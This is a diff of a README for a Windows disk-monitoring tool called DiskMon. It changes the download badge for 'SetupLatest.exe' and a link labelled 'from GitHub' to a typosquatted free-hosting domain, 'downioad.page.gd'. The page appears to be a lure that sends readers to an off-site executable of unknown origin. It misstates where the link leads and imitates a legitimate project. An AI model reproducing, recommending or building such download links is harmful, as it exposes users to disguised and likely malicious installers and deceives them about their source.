@@ -2,7 +2,7 @@
 
 DiskMon is a robust disk monitoring application tailored for Windows 10 and 11 users. It delivers comprehensive insights into disk performance, health, and usage, enabling efficient system management. With DiskMon Advanced Monitor Suite, you can monitor multiple drives, analyze storage trends, and optimize your system for peak performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-SetupLatest.exe-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -64,7 +64,7 @@ A: Ensure the drive is properly connected and recognized by Windows. Check Disk 
 ## Download
 
 For the latest version and updates, please visit the official download page:
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
